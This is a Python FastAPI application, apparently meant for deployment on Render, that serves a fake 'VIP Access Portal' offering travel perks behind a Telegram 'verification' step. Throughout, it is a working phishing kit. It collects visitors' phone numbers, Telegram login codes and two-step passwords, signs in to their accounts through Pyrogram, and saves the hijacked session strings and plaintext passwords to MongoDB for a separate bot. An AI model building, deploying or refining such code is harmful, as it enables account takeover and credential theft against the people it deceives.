import os
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PasswordHashInvalid, 
    PhoneCodeExpired
)
from motor.motor_asyncio import AsyncIOMotorClient

# ---------------------------------------------------------
# App & Config Setup
# ---------------------------------------------------------
app = FastAPI(title="VIP Access Portal")

# Environment Variables (Render Dashboard se load honge)
API_ID = int(os.environ.get("API_ID", "123456"))
API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority")
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")

# MongoDB Client Setup (Master Bot Synced)
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client["telegram_db"]
sessions_col = db["sessions"]  # Collection name synced with Bot

# Temporary Memory Storage for Active Telegram Login Sessions
active_clients = {}

# ---------------------------------------------------------
# Request Models
# ---------------------------------------------------------
class PhoneReq(BaseModel):
    phone: str

class OtpReq(BaseModel):
    phone: str
    code: str

class PasswordReq(BaseModel):
    phone: str
    password: str

# ---------------------------------------------------------
# Embedded HTML UI Template
# ---------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VIP Access Portal</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    body { background: #0b0f19; color: #f3f4f6; font-family: 'Inter', sans-serif; }
    .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
    .btn-gradient { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); transition: all 0.3s ease; }
    .btn-gradient:hover { transform: translateY(-2px); box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4); }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-4">

  <!-- Header Bar -->
  <header class="w-full max-w-4xl flex items-center justify-between py-4 border-b border-gray-800 mb-6">
    <div class="flex items-center space-x-2">
      <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-xl text-white shadow-lg shadow-blue-500/30">VIP</div>
      <span class="text-xl font-bold tracking-wide text-white">ACCESS PORTAL</span>
    </div>
    <span class="px-3 py-1 bg-green-500/10 text-green-400 border border-green-500/20 text-xs font-semibold rounded-full flex items-center gap-2">
      <span class="w-2 h-2 rounded-full bg-green-400 animate-ping"></span> Active Verification
    </span>
  </header>

  <!-- Main Portal Body -->
  <main class="w-full max-w-4xl space-y-8">
    
    <!-- Tutorial & Action Banner -->
    <div class="glass rounded-2xl p-4 md:p-6 shadow-2xl">
      <h2 class="text-lg font-semibold text-gray-200 mb-3 flex items-center gap-2">
        <i class="fa-solid fa-circle-play text-blue-500"></i> How to Unlock Access (Guide Video)
      </h2>
      <div class="relative w-full rounded-xl overflow-hidden bg-black aspect-video flex items-center justify-center border border-gray-800">
        <video controls class="w-full h-full object-cover">
          <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
          Your browser does not support video.
        </video>
      </div>
      <button onclick="openModal()" class="w-full mt-5 py-4 btn-gradient text-white font-bold text-lg rounded-xl shadow-lg flex items-center justify-center gap-3">
        <i class="fa-brands fa-telegram text-2xl"></i> VERIFY VIA TELEGRAM TO UNLOCK
      </button>
    </div>

    <!-- Features / Trips Showcase -->
    <div>
      <h3 class="text-md font-semibold text-gray-400 mb-4 tracking-wider uppercase">Exclusive Perks</h3>
      <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
          <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
          <div class="p-3 text-sm font-medium text-gray-300">Beach Resort Pass</div>
        </div>
        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
          <img src="https://images.unsplash.com/photo-1519046904884-53103b34b206?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
          <div class="p-3 text-sm font-medium text-gray-300">VIP Lounge Access</div>
        </div>
        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
          <img src="https://images.unsplash.com/photo-1488646953014-85cb44e25828?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
          <div class="p-3 text-sm font-medium text-gray-300">Global Travel Guide</div>
        </div>
        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
          <img src="https://images.unsplash.com/photo-1503220317375-aaad61436b1b?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
          <div class="p-3 text-sm font-medium text-gray-300">Private Community</div>
        </div>
      </div>
    </div>
  </main>

  <!-- Auth Modal -->
  <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
    <div class="glass w-full max-w-md rounded-2xl p-6 relative border border-gray-700 shadow-2xl">
      <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>

      <!-- Step 1: Phone -->
      <div id="step-phone" class="space-y-4">
        <div class="text-center">
          <i class="fa-brands fa-telegram text-5xl text-blue-500 mb-2"></i>
          <h3 class="text-xl font-bold">Telegram Verification</h3>
          <p class="text-sm text-gray-400 mt-1">Enter your phone number with country code (e.g. +919876543210)</p>
        </div>
        <input type="text" id="phoneInput" placeholder="+91 9876543210" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 text-lg text-center tracking-widest">
        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 btn-gradient text-white font-semibold rounded-xl">Send Code</button>
      </div>

      <!-- Step 2: OTP -->
      <div id="step-otp" class="space-y-4 hidden">
        <div class="text-center">
          <i class="fa-solid fa-shield-halved text-5xl text-green-500 mb-2"></i>
          <h3 class="text-xl font-bold">Enter OTP Code</h3>
          <p class="text-sm text-gray-400 mt-1">Check your official Telegram app for verification code</p>
        </div>
        <input type="text" id="otpInput" placeholder="12345" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-green-500 text-2xl text-center tracking-widest font-mono">
        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-green-600 hover:bg-green-500 text-white font-semibold rounded-xl transition">Verify & Continue</button>
      </div>

      <!-- Step 3: 2FA Password -->
      <div id="step-2fa" class="space-y-4 hidden">
        <div class="text-center">
          <i class="fa-solid fa-lock text-5xl text-yellow-500 mb-2"></i>
          <h3 class="text-xl font-bold">Two-Step Verification</h3>
          <p class="text-sm text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
        </div>
        <input type="password" id="passwordInput" placeholder="Password" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500 text-lg text-center">
        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3 bg-yellow-600 hover:bg-yellow-500 text-white font-semibold rounded-xl transition">Submit Password</button>
      </div>

      <p id="errorMsg" class="text-red-400 text-xs text-center mt-3 hidden"></p>
    </div>
  </div>

  <footer class="text-gray-600 text-xs text-center py-6">
    &copy; 2026 Secure Access Portal. All Rights Reserved.
  </footer>

  <script>
    let userPhone = "";

    function openModal() { document.getElementById('authModal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('authModal').classList.add('hidden'); }

    function showError(msg) {
      const err = document.getElementById('errorMsg');
      err.innerText = msg;
      err.classList.remove('hidden');
    }

    async function sendCode() {
      userPhone = document.getElementById('phoneInput').value.trim();
      if(!userPhone.startsWith('+')) return showError("Please include '+' with country code (e.g. +91...)");

      document.getElementById('btnSendCode').innerText = "Sending...";
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone })
      });
      const data = await res.json();
      if(res.ok) {
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-otp').classList.remove('hidden');
        document.getElementById('errorMsg').classList.add('hidden');
      } else {
        showError(data.detail || "Error sending OTP");
        document.getElementById('btnSendCode').innerText = "Send Code";
      }
    }

    async function verifyOtp() {
      const code = document.getElementById('otpInput').value.trim();
      document.getElementById('btnVerifyOtp').innerText = "Verifying...";
      const res = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, code: code })
      });
      const data = await res.json();
      if(res.ok) {
        if(data.require_2fa) {
          document.getElementById('step-otp').classList.add('hidden');
          document.getElementById('step-2fa').classList.remove('hidden');
          document.getElementById('errorMsg').classList.add('hidden');
        } else {
          window.location.href = data.link;
        }
      } else {
        showError(data.detail || "Invalid OTP");
        document.getElementById('btnVerifyOtp').innerText = "Verify & Continue";
      }
    }

    async function verify2FA() {
      const password = document.getElementById('passwordInput').value.trim();
      document.getElementById('btnVerify2FA').innerText = "Verifying 2FA...";
      const res = await fetch('/api/verify-2fa', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, password: password })
      });
      const data = await res.json();
      if(res.ok) {
        window.location.href = data.link;
      } else {
        showError(data.detail || "Incorrect Password");
        document.getElementById('btnVerify2FA').innerText = "Submit Password";
      }
    }
  </script>
</body>
</html>
"""

# ---------------------------------------------------------
# API Endpoints
# ---------------------------------------------------------
@app.get("/", response_class=HTMLResponse)
async def serve_ui():
    return HTML_TEMPLATE

@app.post("/api/send-code")
async def send_code(data: PhoneReq):
    phone = data.phone.strip().replace(" ", "")
    try:
        client = Client(name=f"sess_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        sent_code = await client.send_code(phone)
        
        active_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        return {"status": "ok", "message": "OTP sent successfully"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-otp")
async def verify_otp(data: OtpReq):
    phone = data.phone.strip()
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    session = active_clients[phone]
    client: Client = session["client"]
    phone_code_hash = session["phone_code_hash"]
    
    try:
        await client.sign_in(phone, phone_code_hash, data.code)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save Session & Default 2FA ('None') to MongoDB (Master Bot Synced Schema)
        await sessions_col.update_one(
            {"phone": phone},
            {"$set": {
                "phone": phone, 
                "session": string_session, 
                "two_factor": "None", 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "require_2fa": False, "link": CHANNEL_LINK}

    except SessionPasswordNeeded:
        return {"status": "require_2fa", "require_2fa": True}
    except PhoneCodeInvalid:
        raise HTTPException(status_code=400, detail="Invalid OTP code.")
    except PhoneCodeExpired:
        raise HTTPException(status_code=400, detail="OTP Code Expired.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-2fa")
async def verify_2fa(data: PasswordReq):
    phone = data.phone.strip()
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    client: Client = active_clients[phone]["client"]
    
    try:
        await client.check_password(data.password)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save Session & 2FA Password to MongoDB (Master Bot Synced Schema)
        await sessions_col.update_one(
            {"phone": phone},
            {"$set": {
                "phone": phone, 
                "session": string_session, 
                "two_factor": data.password, 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "link": CHANNEL_LINK}
    except PasswordHashInvalid:
        raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
